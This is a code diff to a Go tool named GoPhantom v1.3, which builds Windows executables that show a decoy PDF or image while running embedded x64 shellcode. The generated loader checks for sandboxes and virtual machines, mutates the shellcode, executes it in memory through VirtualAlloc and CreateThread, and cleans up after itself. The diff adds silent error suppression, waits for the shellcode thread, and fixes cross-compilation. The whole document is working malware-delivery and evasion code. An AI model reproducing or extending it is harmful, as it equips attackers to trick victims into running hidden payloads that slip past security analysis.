@@ -8,12 +8,14 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"flag"
-	"gofilepacker/internal/keymgr"
+	"fmt"
+	"GoPhantom/internal/keymgr"
 	"io"
 	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"text/template"
 )
 
@@ -170,6 +172,11 @@ func getAdvapi32() uintptr {
 	return uintptr(advapi32)
 }
 
+func getShell32() uintptr {
+	shell32, _ := syscall.LoadLibrary("shell32.dll")
+	return uintptr(shell32)
+}
+
 // 简化的API解析
 func getProcAddr(module uintptr, procName string) uintptr {
 	addr, _ := syscall.GetProcAddress(syscall.Handle(module), procName)
@@ -178,8 +185,19 @@ func getProcAddr(module uintptr, procName string) uintptr {
 
 // 扩展的反沙箱检测
 func antiSandboxChecks() bool {
+	// 添加基本的错误处理
+	defer func() {
+		if r := recover(); r != nil {
+			// 如果检测过程中出现panic，假设是真实环境
+		}
+	}()
+	
 	// 1. CPU核心数检查
 	kernel32 := getKernel32()
+	if kernel32 == 0 {
+		return true // 如果无法加载kernel32，假设是真实环境
+	}
+	
 	getSystemInfo := getProcAddr(kernel32, "GetSystemInfo")
 	if getSystemInfo != 0 {
 		var si SYSTEM_INFO
@@ -203,7 +221,7 @@ func antiSandboxChecks() bool {
 	// 3. 简化的注册表检查
 	advapi32 := getAdvapi32()
 	regOpenKeyEx := getProcAddr(advapi32, "RegOpenKeyExA")
-	regCloseKey := getProcAddr(kernel32, "RegCloseKey")
+	regCloseKey := getProcAddr(advapi32, "RegCloseKey")
 	
 	if regOpenKeyEx != 0 && regCloseKey != 0 {
 		vmKeys := []string{
@@ -404,11 +422,22 @@ func mutateShellcode(shellcode []byte) []byte {
 }
 // 在当前进程中执行shellcode
 func executeShellcode(shellcode []byte) {
+	// 添加基本的错误处理
+	defer func() {
+		if r := recover(); r != nil {
+			// 如果执行过程中出现panic，静默处理
+		}
+	}()
+	
 	kernel32 := getKernel32()
+	if kernel32 == 0 {
+		return
+	}
 	
 	virtualAlloc := getProcAddr(kernel32, "VirtualAlloc")
 	virtualProtect := getProcAddr(kernel32, "VirtualProtect")
 	createThread := getProcAddr(kernel32, "CreateThread")
+	waitForSingleObject := getProcAddr(kernel32, "WaitForSingleObject")
 	
 	if virtualAlloc == 0 || virtualProtect == 0 || createThread == 0 {
 		return
@@ -436,7 +465,12 @@ func executeShellcode(shellcode []byte) {
 		0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0) // PAGE_EXECUTE_READ
 	
 	// 5. 创建线程执行
-	syscall.Syscall6(createThread, 6, 0, 0, addr, 0, 0, 0)
+	threadHandle, _, _ := syscall.Syscall6(createThread, 6, 0, 0, addr, 0, 0, 0)
+	
+	// 6. 等待线程完成（可选）
+	if threadHandle != 0 && waitForSingleObject != 0 {
+		syscall.Syscall(waitForSingleObject, 2, threadHandle, 0xFFFFFFFF, 0) // INFINITE
+	}
 }
 
 // 自清理机制
@@ -486,8 +520,8 @@ func main() {
 		
 		if writeErr := os.WriteFile(decoyPath, decoyBytes, 0644); writeErr == nil {
 			// 使用ShellExecute打开文件
-			shell32, _ := syscall.LoadLibrary("shell32.dll")
-			shellExecuteA := getProcAddr(uintptr(shell32), "ShellExecuteA")
+			shell32 := getShell32()
+			shellExecuteA := getProcAddr(shell32, "ShellExecuteA")
 			
 			if shellExecuteA != 0 {
 				verb, _ := syscall.BytePtrFromString("open")
@@ -588,21 +622,56 @@ func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, e
 }
 
 func main() {
+	// 确保在 Windows 上也能正常显示输出
 	log.SetFlags(0)
-	log.Println(logo)
-
+	
+	// 定义所有标志
 	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
 	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
 	outputFile := flag.String("out", "", "Required: Final output executable name.")
 	enableObfuscate := flag.Bool("obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
 	enableMutate := flag.Bool("mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
 	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
+	
+	// 自定义用法信息
+	flag.Usage = func() {
+		fmt.Fprintf(os.Stderr, "%s\n", logo)
+		fmt.Fprintf(os.Stderr, "Usage: %s [OPTIONS]\n\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "Required flags:\n")
+		fmt.Fprintf(os.Stderr, "  -decoy string\n        Path to the decoy file (e.g., a PDF or image)\n")
+		fmt.Fprintf(os.Stderr, "  -payload string\n        Path to the raw x64 shellcode file (e.g., beacon.bin)\n")
+		fmt.Fprintf(os.Stderr, "  -out string\n        Final output executable name\n\n")
+		fmt.Fprintf(os.Stderr, "Optional flags:\n")
+		fmt.Fprintf(os.Stderr, "  -compress\n        Enable zlib compression of embedded data (default: true)\n")
+		fmt.Fprintf(os.Stderr, "  -obfuscate\n        Enable sleep-obfuscation in generated loader\n")
+		fmt.Fprintf(os.Stderr, "  -mutate\n        Enable shellcode mutation with random NOPs\n")
+		fmt.Fprintf(os.Stderr, "  -h, --help\n        Show this help message\n\n")
+		fmt.Fprintf(os.Stderr, "Example:\n")
+		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate\n\n", os.Args[0])
+	}
+	
+	// 检查帮助参数
+	if len(os.Args) > 1 && (os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "-help") {
+		flag.Usage()
+		return
+	}
+	
+	log.Println(logo)
 	flag.Parse()
 
 	if *decoyFile == "" || *payloadFile == "" || *outputFile == "" {
-		log.Println("\nError: All -decoy, -payload, and -out flags are required.")
-		log.Println("Usage:")
-		flag.PrintDefaults()
+		fmt.Fprintf(os.Stderr, "\n❌ Error: Missing required parameters!\n\n")
+		if *decoyFile == "" {
+			fmt.Fprintf(os.Stderr, "Missing -decoy: Please specify a decoy file path\n")
+		}
+		if *payloadFile == "" {
+			fmt.Fprintf(os.Stderr, "Missing -payload: Please specify a shellcode file path\n") 
+		}
+		if *outputFile == "" {
+			fmt.Fprintf(os.Stderr, "Missing -out: Please specify an output file name\n")
+		}
+		fmt.Fprintf(os.Stderr, "\nUse '%s -h' for help.\n\n", os.Args[0])
 		os.Exit(1)
 	}
 
@@ -666,6 +735,22 @@ func main() {
 	if err := tmpfile.Close(); err != nil {
 		log.Fatalf("[-] Failed to close temp file: %v", err)
 	}
+	
+	// 创建临时 go.mod 文件
+	tmpDir := filepath.Dir(tmpfile.Name())
+	goModPath := filepath.Join(tmpDir, "go.mod")
+	goModContent := `module temploader
+
+go 1.20
+
+require golang.org/x/crypto v0.25.0
+
+require golang.org/x/sys v0.34.0 // indirect
+`
+	if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
+		log.Fatalf("[-] Failed to create temp go.mod: %v", err)
+	}
+	defer os.Remove(goModPath)
 
 	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
 	
@@ -689,12 +774,38 @@ func main() {
 	}
 
 	ldflags := "-s -w -H windowsgui"
-	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
-	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
+	// 使用绝对路径作为输出文件
+	absOutputFile, err := filepath.Abs(*outputFile)
+	if err != nil {
+		log.Fatalf("[-] Failed to get absolute path: %v", err)
+	}
+	cmd := exec.Command("go", "build", "-mod=mod", "-o", absOutputFile, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
+	cmd.Dir = tmpDir  // 在临时目录中运行
+	
+	// 设置环境变量，确保交叉编译到 Windows
+	env := os.Environ()
+	env = append(env, "CGO_ENABLED=0")
+	// 移除 GO111MODULE=off，保持模块支持以便使用外部依赖
+	
+	// 只有在非 Windows 系统上才需要设置 GOOS
+	if runtime.GOOS != "windows" {
+		env = append(env, "GOOS=windows")
+		env = append(env, "GOARCH=amd64")
+	} else {
+		// 在 Windows 上，确保编译为 64 位
+		env = append(env, "GOARCH=amd64")
+	}
+	
+	cmd.Env = env
 
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		log.Fatalf("[-] Compilation failed:\n%s", string(output))
+		log.Printf("[-] Compilation failed: %v", err)
+		if len(output) > 0 {
+			log.Printf("[-] Compiler output:\n%s", string(output))
+		}
+		log.Printf("[-] Try running with verbose output for more details")
+		os.Exit(1)
 	}
 
 	log.Printf("\n[✓] Successfully generated GoPhantom v1.3 loader: %s\n", *outputFile)
